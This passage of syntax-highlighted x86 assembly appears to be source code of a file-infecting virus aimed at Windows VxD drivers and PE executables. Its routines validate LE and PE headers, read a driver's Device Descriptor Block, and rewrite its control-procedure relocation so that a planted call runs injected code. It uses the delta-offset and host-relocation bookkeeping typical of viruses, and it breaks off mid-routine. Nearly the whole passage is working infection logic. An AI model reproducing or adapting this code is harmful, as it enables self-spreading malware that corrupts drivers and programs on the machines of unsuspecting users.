                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_magic</span><span class="sc4">],(</span><span class="sc5">IMAGE_VXD_LEWO</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">)\
</span><span class="sc0">                </span><span class="sc4">+(</span><span class="sc5">IMAGE_VXD_LEBO</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)+</span><span class="sc5">IMAGE_VXD_SIGNATURE</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Exit_LE_Check</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_level</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Exit_LE_Check</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_cpu</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">IMAGE_VXD_OS_DEV386</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)+</span><span class="sc5">IMAGE_VXD_CPU_386</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">Exit_LE_Check</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">IMAGE_VXD_OS_DEV386</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)+</span><span class="sc5">IMAGE_VXD_CPU_586</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">Exit_LE_Check</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_mflags</span><span class="sc4">],</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">IMAGE_VXD_MODMASK</span><span class="sc4">+</span><span class="sc5">IMAGE_VXD_NOEXTFIX</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Exit_LE_Check</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_pagesize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Min_Page_Size</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">Exit_LE_Check</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Max_Page_Size</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">Exit_LE_Check</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_itermap</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Exit_LE_Check</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_rsrccnt</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Exit_LE_Check</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_dircnt</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Exit_LE_Check</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_impmodcnt</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc1">;jne Exit_LE_Check</span><span class="sc0">
</span><span class="sc5">Exit_LE_Check</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Check for a valid PE header</span><span class="sc0">
</span><span class="sc1">;ş On entry:</span><span class="sc0">
</span><span class="sc1">;  ESI=Pointer to PE header</span><span class="sc0">
</span><span class="sc1">;ş On exit:</span><span class="sc0">
</span><span class="sc1">;  EAX=?</span><span class="sc0">
</span><span class="sc1">;  * Zero flag set: Valid PE</span><span class="sc0">
</span><span class="sc1">;  * Zero flag clear: Invalid PE</span><span class="sc0">
</span><span class="sc5">Check_Valid_PE</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_Signature</span><span class="sc4">],</span><span class="sc5">IMAGE_NT_SIGNATURE</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Exit_PE_Check</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_FileHeader.FH_Machine</span><span class="sc4">],</span><span class="sc5">IMAGE_FILE_MACHINE_I386</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Exit_PE_Check</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_FileHeader\
</span><span class="sc0">                </span><span class="sc5">.FH_SizeOfOptionalHeader</span><span class="sc4">],</span><span class="sc5">IMAGE_SIZEOF_NT_OPTIONAL_HEADER</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Exit_PE_Check</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_FileHeader.FH_Characteristics</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,(</span><span class="sc5">IMAGE_FILE_SYSTEM</span><span class="sc4">+</span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Exit_PE_Check</span><span class="sc0">
                </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Exit_PE_Check</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_32BIT_MACHINE</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Exit_PE_Check</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.NT_OptionalHeader.OH_Magic</span><span class="sc4">],</span><span class="sc5">IMAGE_NT_OPTIONAL_HDR_MAGIC</span><span class="sc0">
                </span><span class="sc1">;jne Exit_PE_Check</span><span class="sc0">
</span><span class="sc5">Exit_PE_Check</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Read and update DDB related data</span><span class="sc0">
</span><span class="sc1">;ş On entry:</span><span class="sc0">
</span><span class="sc1">;  ESI=Pointer to LE header</span><span class="sc0">
</span><span class="sc1">;  EDI=File_Delta</span><span class="sc0">
</span><span class="sc1">;  File_Handle=Handle of file to read</span><span class="sc0">
</span><span class="sc1">;  LE_Info_Mem=Pointer to LE info (allocated memory)</span><span class="sc0">
</span><span class="sc1">;ş On exit:</span><span class="sc0">
</span><span class="sc1">;  * Carry flag clear:</span><span class="sc0">
</span><span class="sc1">;    DDB_Offset_Obj=Offset of the DDB_Reserved3-1 field (in first object)</span><span class="sc0">
</span><span class="sc1">;    DDB_Offset_File=Offset (within file) of DDB</span><span class="sc0">
</span><span class="sc1">;    DDB_Buffer filled with updated DDB</span><span class="sc0">
</span><span class="sc1">;    LE info updated (if necessary)</span><span class="sc0">
</span><span class="sc1">;    Host_Relocation updated</span><span class="sc0">
</span><span class="sc1">;  * Carry flag set: ERROR</span><span class="sc0">
</span><span class="sc5">Update_DDB</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Get_Object_Table</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.OH_flags</span><span class="sc4">],</span><span class="sc5">IMAGE_OBJ_READ</span><span class="sc4">+</span><span class="sc5">IMAGE_OBJ_EXEC\
</span><span class="sc0">                </span><span class="sc4">+</span><span class="sc5">IMAGE_OBJ_PRELOAD</span><span class="sc4">+</span><span class="sc5">IMAGE_OBJ_BIGDEF</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Update_DDB_Fail</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_enttab</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Recalc</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.EB_type</span><span class="sc4">],((</span><span class="sc5">IMAGE_ENT_EXPORT</span><span class="sc4">+</span><span class="sc5">IMAGE_ENT_SHARED</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">)\
</span><span class="sc0">                </span><span class="sc4">+(</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">)+</span><span class="sc5">IMAGE_BND_ENTRY32</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Update_DDB_Fail</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">IMAGE_SIZEOF_ENTRY_BUNDLE.EH_offset</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">eax.</span><span class="sc4">(</span><span class="sc5">DDB_Reserved3</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DDB_Offset_Obj</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Calculate_Page</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Get_Page_Offset</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Bad_DDB_Page</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DDB_Offset_File</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">VxD_Desc_Block</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">DDB_Buffer</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIO_Read</span><span class="sc0"> </span><span class="sc1">;Read DDB</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">Bad_DDB_Page</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Update_DDB_Fail</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">DDB_Control_Proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Calculate_Page</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_fpagetab</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Recalc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc5">IMAGE_SIZEOF_FIXUP_PAGE_HEADER</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc5">IMAGE_SIZEOF_FIXUP_PAGE_HEADER\
</span><span class="sc0">                </span><span class="sc4">+</span><span class="sc5">IMAGE_SIZEOF_FIXUP_PAGE_HEADER</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_frectab</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Recalc</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Find_Reloc</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">Modify_Reloc</span><span class="sc0"> </span><span class="sc1">;Relocation found</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">Update_DDB_Fail</span><span class="sc0"> </span><span class="sc1">;Unknown relocation type</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DDB_Offset_Obj</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">DDB_Buffer.DDB_Control_Proc</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Store_Displacement</span><span class="sc0">
</span><span class="sc5">Modify_Reloc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DDB_Offset_Obj</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Modify_Reloc32</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Update_DDB_Fail</span><span class="sc0"> </span><span class="sc1">;Offset doesn't fit in relocation</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Store_Displacement</span><span class="sc0">
</span><span class="sc5">Modify_Reloc32</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Store_Displacement</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">Host_Relocation</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc1">;Store:</span><span class="sc0">
                </span><span class="sc1">;call $+5 (at (DDB_Reserved3-1))</span><span class="sc0">
                </span><span class="sc1">;This call will be patched with a relocation</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">DDB_Buffer.</span><span class="sc4">(</span><span class="sc5">DDB_Reserved3</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)-</span><span class="sc5">File_Delta</span><span class="sc4">)],</span><span class="sc2">0e8h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc5">DDB_Buffer.DDB_Reserved3</span><span class="sc4">-</span><span class="sc5">File_Delta</span><span class="sc4">)],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">clc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Update_DDB_Fail</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Calculate page relative offset</span><span class="sc0">
</span><span class="sc1">;ş On entry:</span><span class="sc0">
</span><span class="sc1">;  EAX=Offset (within first object)</span><span class="sc0">
</span><span class="sc1">;  ESI=Pointer to LE header</span><span class="sc0">
</span><span class="sc1">;  LE_Info_Mem=Pointer to LE info (allocated memory)</span><span class="sc0">
</span><span class="sc1">;ş On exit:</span><span class="sc0">
</span><span class="sc1">;  EAX=?</span><span class="sc0">
</span><span class="sc1">;  ECX=Page number</span><span class="sc0">
</span><span class="sc1">;  EDX=Offset (within page)</span><span class="sc0">
</span><span class="sc5">Calculate_Page</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cdq</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.LE_pagesize</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Get_Object_Table</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.OH_pagemap</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;Find a relocation (within a page)</span><span class="sc0">
</span><span class="sc1">;ş On entry:</span><span class="sc0">
</span><span class="sc1">;  EBX=Start of "Fixup Record" data for the page</span><span class="sc0">
</span><span class="sc1">;  ECX=End of "Fixup Record" data for the page</span><span class="sc0">
</span><span class="sc1">;  DX=Offset to seek (within the page)</span><span class="sc0">
</span><span class="sc1">;ş On exit:</span><span class="sc0">
</span><span class="sc1">;  EAX,EBX=?</span><span class="sc0">
</span><span class="sc1">;  * Carry flag clear:</span><span class="sc0">
</span><span class="sc1">;    EDX=Pointer to relocation</span><span class="sc0">
</span><span class="sc1">;    AH=0: 16-bit relocation</span><span class="sc0">
</span><span class="sc1">;    AH&gt;0: 32-bit relocation</span><span class="sc0">
</span><span class="sc1">;  * Carry flag set:</span><span class="sc0">
</span><span class="sc1">;    EBXòECX: Relocation not found</span><span class="sc0">
</span><span class="sc1">;    EBX&lt;ECX: ERROR</span><span class="sc0">
</span><span class="sc5">Find_Reloc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc5">Find_Reloc_Next</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">Find_Reloc_Fail</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.FR_stype</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">IMAGE_RLC_32BITOFF</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Find_Reloc_Fail</span><span class="sc0"> </span><span class="sc1">;Invalid relocation type</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IMAGE_RLC_ST_CHAIN</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Reloc_List</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IMAGE_RLC_ST_SOFF32</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Skip_Reloc</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">IMAGE_RLC_ST_OFF32</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Find_Reloc_Fail</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.FR_fixup.FH_obj</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Skip_Reloc</span><span class="sc0"> </span><span class="sc1">;Wrong object</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.FR_fixup.FH_soff</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Skip_Reloc</span><span class="sc0"> </span><span class="sc1">;Wrong source offset</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ebx.FR_fixup.FH_offset</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Find_Reloc_OK</span><span class="sc0">
</span><span class="sc5">Skip_Reloc</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">IMAGE_RLC_INTSIZE16</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Go_Next_Reloc</span><span class="sc0">
</span><span class="sc5">Reloc_List</span><span class="sc4">:</span><span class="sc0">
